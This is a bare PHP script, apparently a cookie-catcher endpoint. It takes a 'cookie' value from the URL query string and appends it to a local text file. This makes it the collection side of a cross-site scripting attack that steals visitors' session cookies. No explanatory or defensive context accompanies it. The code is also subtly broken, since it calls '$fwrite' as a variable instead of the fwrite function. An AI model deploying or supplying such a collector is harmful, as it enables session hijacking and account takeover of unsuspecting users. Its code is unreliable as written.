<?php 
$myfile = fopen("cookiedat.txt", "a");
$txt = $_GET['cookie'];
$fwrite($myfile, $txt);
fclose($myfile);
?>
